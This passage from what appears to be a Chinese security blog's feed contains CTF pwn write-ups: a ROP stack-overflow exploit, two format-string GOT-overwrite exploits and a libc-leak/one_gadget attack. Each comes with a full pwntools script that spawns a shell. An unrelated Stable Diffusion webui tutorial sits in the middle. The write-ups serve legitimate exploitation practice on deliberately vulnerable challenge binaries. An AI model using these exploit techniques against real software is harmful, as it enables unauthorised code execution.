<th>函数</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td><code>main</code></td>
<td>0x0000000000400AA4</td>
</tr>
<tr>
<td><code>vuln</code></td>
<td>0x0000000000400A6C</td>
</tr>
<tr>
<td><code>read</code></td>
<td>0x000000000043FDF0</td>
</tr>
<tr>
<td><code>syscall</code></td>
<td>0x000000000043F435</td>
</tr>
<tr>
<td><code>mov rax rdi ; ret</code></td>
<td>0x0000000000417260</td>
</tr>
<tr>
<td><code>pop rdi; ret</code></td>
<td>0x00000000004016e6</td>
</tr>
<tr>
<td><code>pop rsi; ret</code></td>
<td>0x0000000000401807</td>
</tr>
<tr>
<td><code>pop rdx; ret</code></td>
<td>0x00000000004432a6</td>
</tr>
<tr>
<td><code>&quot;/bin/sh&quot;</code></td>
<td>0x00000000006CCC72</td>
</tr>
<tr>
<td><code>ret</code></td>
<td>0x0000000000400AC2</td>
</tr>
</tbody></table>
<ul>
<li><p>进行栈溢出攻击的过程：首先在<code>vuln</code>函数处制造栈溢出，调用<code>read</code>函数将<code>&quot;/bin/sh&quot;</code>函数传入文件地址<code>0x00000000006CCC72</code>中，<code>payload1</code>构造为<code>b&#39;a&#39; * (0x20 + 8) + ret + pop rdi + 0 + pop rsi + bss_addr + pop rdx + 8 + read + main_addr</code>，然后继续制造栈溢出，调用<code>syscall</code>函数，执行命令，构造<code>payload2</code>为<code>b&#39;a&#39; * (0x20 + 8) + pop_rdi + 0x3b + mov_rax_rdi + pop rdi + &quot;/bin/sh&quot; addr + pop rsi + 0 + pop rdx + 0 + syscall </code>。</p>
</li>
<li><p>构造python脚本，如下，由于未查询到标准的<code>pop rax ; ret</code>片段，使用了<code>mov rax rdi ; ret</code>片段先赋值给rdi，然后再赋值给rax：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./1stStep&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置参数, payload</span></span><br><span class="line">mov_rax_rdi = <span class="number">0x417260</span></span><br><span class="line">pop_rdi = <span class="number">0x4016e6</span></span><br><span class="line">pop_rsi = <span class="number">0x401807</span></span><br><span class="line">pop_rdx = <span class="number">0x4432a6</span></span><br><span class="line">syscall = <span class="number">0x43F435</span></span><br><span class="line">bss = <span class="number">0x6CCC72</span></span><br><span class="line">vul = <span class="number">0x400A6C</span></span><br><span class="line">read = <span class="number">0x43FDF0</span></span><br><span class="line">ret = <span class="number">0x400AC2</span></span><br><span class="line">main_addr = <span class="number">0x400AA4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次将&quot;/bin/sh&quot;写入内存</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Go explore and exploit here\x1B[0m&quot;</span>)</span><br><span class="line">payload1 = flat(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), ret, pop_rdi, <span class="number">0</span>, pop_rsi, bss, pop_rdx, <span class="number">8</span>, read, main_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后进行ROP攻击</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Go explore and exploit here\x1B[0m&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x400AA2&quot;)</span></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), pop_rdi, <span class="number">0x3b</span>, mov_rax_rdi, pop_rdi, bss, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, syscall)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>成功执行命令，如下图：</p>
<p><img src="/img/posts/2023-10-23-1stStep/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>AI绘图工具以及使用教程</title>
    <url>/posts/75b509d1.html</url>
    <content><![CDATA[<h1 id="AI绘图工具以及使用教程"><a href="#AI绘图工具以及使用教程" class="headerlink" title="AI绘图工具以及使用教程"></a>AI绘图工具以及使用教程</h1><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>先放一下结果吧，本人机器只有GTX1650，所以生成的图片质量以及分辨率十分有限~</p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00001-1891544376.png" alt="00001-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00005-1891544376.png" alt="00005-1891544376.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00009-2832915632.png" alt="00009-2832915632.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00036-3604192810.png" alt="00036-3604192810.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00050-4188726228.png" alt="00050-4188726228.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00066-114514.png" alt="00066-114514.png"></p>
<p><img src="https://img.xhacgn.com/images/2023/04/20/00069-1234567891f55fa507eb30f6a.png" alt="00069-1234567891f55fa507eb30f6a.png"></p>
<p>大概就是这样，模型可以在<a href="https://civitai.com/">civatai</a>（需魔法）和[Hugging Face](<a href="https://huggingface.co/">Hugging Face – The AI community building the future.</a>)中找。</p>
<h2 id="stable-diffusion-webui工具安装"><a href="#stable-diffusion-webui工具安装" class="headerlink" title="stable-diffusion-webui工具安装"></a>stable-diffusion-webui工具安装</h2><p>[stable-diffusion官网](<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">AUTOMATIC1111&#x2F;stable-diffusion-webui: Stable Diffusion web UI (github.com)</a>)在这里，可以参照里面的Readme文档指示进行安装。环境Windows，Linux皆可，python版本最好是3.10（否则可能有一些包会安装失败），无需手动安装pytorch，官方Readme文档里有提到点击运行webui-user.bat（Windows系统，后面都是以windows系统为例）即可自动安装相应包体组件。另外一点需要注意，如果你想要使用python虚拟环境，例如conda，可以编辑webui-user.bat中PYTHON的地址为你的conda环境python地址。</p>
<p>在运行webui-user.bat之前，你需要先下载模型放到指定位置，这里推荐几个模型作为示例，</p>
<ul>
<li><a href="%5Bcivitai.com%5D(https://civitai.com/models/4468/counterfeit-v25)">counterfeit-v25</a>(需魔法）：下载得到.safesensor文件放入\stable-diffusion-webui-master\models\Stable-diffusion路径下。这个文件夹下必须至少有一个模型文件，.safesensor, .ckpt文件皆可。</li>
</ul>
<p>下面是几个模型文件例子，可以自行百度查找。<img src="https://img.xhacgn.com/images/2023/04/20/a40c51e8c197fdf4871351c6e6868664.png" alt="a40c51e8c197fdf4871351c6e6868664.png"></p>
<p>然后就可以直接点击运行webui-user.bat文件，运行过程中如果出现报错，请确认你的python版本正确（一般命令行报错信息会提示你），然后如果显示安装失败，那么大概率是网络问题，请检查你的网络配置，代理是否开启，然后关闭命令行重新运行。</p>
<p>安装好后，就可以按照命令行提示打开<a href="http://127.0.0.1:7860/%E7%84%B6%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5prompts%E4%BB%A5%E5%8F%8A%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CAI%E7%BB%98%E5%9B%BE%E4%BA%86%EF%BC%81%E5%BD%93%E7%84%B6%E4%B8%80%E5%AE%9A%E8%A6%81%E6%B3%A8%E6%84%8F%E8%87%AA%E5%B7%B1%E7%9A%84%E6%98%BE%E5%8D%A1%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%AC%E4%BA%BA4GB%E6%98%BE%E5%AD%98%E5%B0%B1%E5%8F%AA%E8%83%BD%E7%94%BB%E5%A4%A7%E6%A6%82900x400%E8%BF%99%E4%B8%AA%E5%88%86%E8%BE%A8%E7%8E%87%EF%BC%88%E5%8B%BE%E9%80%89hires.fix%E5%8F%82%E6%95%B0%E5%90%8E%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%8B%BE%E9%80%89%E7%9A%84%E8%AF%9D%E6%9C%80%E5%A4%A7%E4%B9%9F%E5%B0%B1512x512">http://127.0.0.1:7860/然后就可以输入prompts以及各种参数进行AI绘图了！当然一定要注意自己的显卡配置，例如本人4GB显存就只能画大概900x400这个分辨率（勾选hires.fix参数后），不勾选的话最大也就512x512</a>~</p>
<h2 id="stable-diffusion-web-ui简要介绍"><a href="#stable-diffusion-web-ui简要介绍" class="headerlink" title="stable diffusion web ui简要介绍"></a>stable diffusion web ui简要介绍</h2><p><img src="https://img.xhacgn.com/images/2023/04/20/screenshot.png" alt="screenshot.png"></p>
<ul>
<li>stable diffusion checkpoint：你下载的模型，包含在上面提到的文件夹下的所有模型文件，可以选择任何一个模型进行加载。</li>
<li>Prompts：提示词，AI会根据该提示词进行绘制</li>
<li>Negative Prompts：负面提示词，AI会尽量避免里面的关键词</li>
<li>Sampling method：数据采样方式，没什么大影响</li>
<li>Sampling steps：采样步数，20-50就可以了，当然你再多一些也没关系，就是运行时间会久一些，还没试过效果会不会有明显改善</li>
<li><strong>Restore faces：</strong>在图象生成后再对面部进行优化，<strong>十分重要！！！</strong></li>
<li><strong>Hires.fix：</strong>可以将本来较小分辨率的图片再扩展成较大分辨率的图片</li>
<li>Batch Count：训练几张图片，串行生成</li>
<li>Batch Size：一次训练几张图片，并行生成</li>
<li>CFG Scale：AI绘图对Prompt的倾向性有多强。</li>
<li>Seed：种子，你可以按照我的世界的地图种子来理解。</li>
</ul>
<p>可以在<a href="https://civitai.com/">civatai</a>网站中找到自己喜欢的图片，里面会有相应的Prompts等参数，一般而言参数一模一样的话，产生的图也会比较相似。</p>
<p>下面给一个通用Prompts，用于画二次元少女图的</p>
<p>Prompt：masterpiece，beat quality，1girl</p>
<p>Negative Prompt：nsfw,blush,lowres, bad anatomy, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts,signature, watermark, username, blurry, artist name,bad feet,big head,fused body,multiple hands,multiple legs,multiple hands,multiple breast,multiple lower legs,multiple thighs,fused body,twist body</p>
<p>其他参数自己调就可以了。（只要不太过分都是没问题的~~~）</p>
]]></content>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞实验报告</title>
    <url>/posts/bb9aef07.html</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞实验报告"><a href="#格式化字符串漏洞实验报告" class="headerlink" title="格式化字符串漏洞实验报告"></a>格式化字符串漏洞实验报告</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>格式化字符串漏洞利用</li>
<li>对64程序与32位程序区别的理解</li>
<li>覆写got表地址</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ul>
<li>使用checksec, file, ldd等命令查看程序信息：</li>
</ul>
<p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF.png" alt="基本信息"></p>
<p>​		可见程序为64位，启动了DEP保护，动态链接。</p>
<ul>
<li>使用patchelf修改libc文件。</li>
</ul>
<p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/patchelf.png" alt="patchelf"></p>
<ul>
<li>使用ida库打开程序，反编译。</li>
</ul>
<p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/main.png" alt="main"></p>
<p>​		可以发现<code>printf(buf)</code>代码存在格式化字符串漏洞。</p>
<ul>
<li>构造python脚本进行gdb调试：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;%1$p&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x4006AD&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>​		<code>%1$p</code>表示输出第一个参数的指针形式输出<img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/gdb.png" alt="gdb"></p>
<p>​		查看栈中情况，可以发现<code>_libc_stat_main+240</code>地址，计算得到该地址为第26个参数（64位程序需要注意前6个参数会在寄存器中）。因此要泄漏<code>libc</code>地址，可以利用<code>%25$p</code>。</p>
<ul>
<li>获取libc基址后，可以获取libc中的<code>system</code>函数地址。然后可以通过修改printf函数got表的方式来使程序在执行<code>printf</code>函数转去执行<code>system</code>函数，并且以输入<code>&quot;/bin/sh&quot;</code>字符串达到执行函数<code>system(&quot;/bin/sh&quot;)</code>的目的。</li>
<li>由于64位程序中函数地址高位为<code>\x00</code>，因此会导致printf函数输出时截断，所以构造payload时printf函数地址需要放在末尾，然后由于64位地址如果使用<code>%n</code>直接对整体进行修改的话，会造成printf输出字符数目过大，耗时且易崩溃。所以考虑使用<code>%hn</code>来进行两字节的修改。</li>
<li>构造payload，根据system函数的地址分两次修改。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag: tmp1 &lt; tmp2时为True</span></span><br><span class="line"><span class="comment"># tmp1: 高两字节， tmp2: 低两字节</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>​		发送payload后栈情况：</p>
<p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb.png" alt="payload-gdb"></p>
<p>​		执行printf函数后，可见printf函数got表地址已被修改为system函数地址，然后输入<code>&quot;/bin/sh&quot;</code>字符串，即可返回shell。</p>
<p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/payload-gdb-1.png" alt="payload-gdb-1"></p>
<ul>
<li>最终python脚本如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取read函数在libc中偏移</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x4006AD&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Format String\n&quot;</span>, payload)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x20840</span>  <span class="comment"># 0x20840</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">tmp1 = tmp[<span class="number">6</span>:<span class="number">10</span>]</span><br><span class="line">tmp2 = tmp[<span class="number">10</span>:<span class="number">14</span>]</span><br><span class="line">tmp1 = <span class="built_in">int</span>(tmp1, <span class="number">16</span>)</span><br><span class="line">tmp2 = <span class="built_in">int</span>(tmp2, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> tmp1 &gt; tmp2:</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    tmp1 = tmp1 - tmp2</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    tmp2 = tmp2 - tmp1</span><br><span class="line"><span class="built_in">print</span>(tmp1)</span><br><span class="line"><span class="built_in">print</span>(tmp2)</span><br><span class="line">tmp1 = <span class="built_in">str</span>(tmp1)</span><br><span class="line">tmp2 = <span class="built_in">str</span>(tmp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改got表</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./format_string&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(printf_got)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%10$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c%11$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fmt = flat(<span class="string">b&#x27;%&#x27;</span>, tmp2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%11$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, tmp1, <span class="string">b&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">    fmt = fmt.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload = flat(fmt, printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送&quot;/bin/sh&quot;字符串</span></span><br><span class="line">payload = flat(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/img/posts/2023-10-12-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_c_1 WriteUp</title>
    <url>/posts/daa10577.html</url>
    <content><![CDATA[<h1 id="ciscn-2019-c-1-WriteUp"><a href="#ciscn-2019-c-1-WriteUp" class="headerlink" title="ciscn_2019_c_1 WriteUp"></a>ciscn_2019_c_1 WriteUp</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>libc版本泄漏</li>
<li>ROP攻击</li>
<li>onegadget使用</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>使用<code>checksec</code>工具进行查看，程序为64位，NX保护</li>
</ol>
<p><img src="/img/posts/2023-10-23-ciscn_2019_c_1/images/checksec.png" alt="checksec"></p>
<ol start="2">
<li>使用ida工具反编译。</li>
</ol>
<p><code>main</code>:</p>
<p><img src="/img/posts/2023-10-23-ciscn_2019_c_1/images/main.png" alt="main"></p>
<p><code>encrypt</code>：</p>
<p><img src="/img/posts/2023-10-23-ciscn_2019_c_1/images/encrypt.png" alt="encrypt"></p>
<p>​		可以看出程序功能为对输入字符串进行加密，而加密<code>encrypt</code>函数中的get存在栈溢出漏洞。</p>
<ol start="3">
<li>由于在程序中找不到<code>system</code>函数和<code>/bin/sh</code>字符串，所以需要进行ROP攻击，泄漏其libc地址，使用onegadget工具直接获取shell。</li>
<li>使用ROPgadget工具获取泄漏libc地址所需的指令地址(<code>pop rdi</code>; )，然后获取程序中put_got表和put_plt表地址，执行栈溢出payload构造如下</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br></pre></td></tr></table></figure>

<p>​		注意最后需要加上encrypt函数使程序重新回到漏洞函数处。</p>
<ol start="5">
<li>获取libc基址后，再次进入漏洞函数，然后执行onegadget指令。获取shell。</li>
</ol>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><strong>构造脚本如下</strong></p>
<p><code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26936</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x10a38c</span>  <span class="comment"># 0x4f322, 0x4f2c5, 0x10a38c</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">encrypt = <span class="number">0x4009A0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, pop_rdi, puts_got, puts_plt, encrypt)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4009DD&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your choice!&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nCiphertext\n\n&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">one_gadget = libc_addr + one_gadget</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&quot;\0&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>), <span class="number">0x0</span>, one_gadget)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input your Plaintext to be encrypted&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获取flag</p>
<p><img src="/img/posts/2023-10-23-ciscn_2019_c_1/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>ROP攻击</tag>
        <tag>libc泄漏</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 第五空间PWN5</title>
    <url>/posts/e2482cb8.html</url>
    <content><![CDATA[<h1 id="第五空间2019-决赛PWN5"><a href="#第五空间2019-决赛PWN5" class="headerlink" title="第五空间2019 决赛PWN5"></a>第五空间2019 决赛PWN5</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>格式化字符串漏洞</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li>首先使用<code>checksec</code>工具查看基本信息</li>
</ol>
<p><img src="/img/posts/2023-10-23-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9BPWN5/images/checksec.png" alt="checksec"></p>
<p>​		为32位，canary，dep防护</p>
<ol start="2">
<li>使用ida工具进行静态分析。</li>
</ol>
<p><code>main</code></p>
<p><img src="/img/posts/2023-10-23-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9BPWN5/images/main.png" alt="main"></p>
<p>​		main函数主要代码如上图所示，可以看见<code>print((int)v7)</code>存在格式化字符串输出漏洞，因此可以考虑进行利用（<strong>注：由于输入read限制了输入长度，导致无法通过泄漏canary方法来进行栈溢出攻击。</strong>）</p>
<ol start="3">
<li>构造python脚本如下，主要思路为修改printf的got表plt地址为要执行的代码地址（若开启full relro则无法使用），然后再代码执行到下一次调用printf函数时会转去执行目标代码。获得shell。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29338</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">info(printf_got)</span><br><span class="line">vuln_1 = <span class="built_in">str</span>(<span class="number">0x0804</span>)</span><br><span class="line">vuln_2 = <span class="built_in">str</span>(<span class="number">0x931A</span>-<span class="number">0x0804</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;%&#x27;</span>, vuln_1, <span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;%17$hn&#x27;</span>, <span class="string">b&#x27;%&#x27;</span>, vuln_2, <span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;%18$hn&#x27;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = flat(payload, printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080492BC&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Hello,&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/img/posts/2023-10-23-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9BPWN5/images/result.png" alt="result"></p>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>messageboard writeup</title>
    <url>/posts/6d53b6de.html</url>
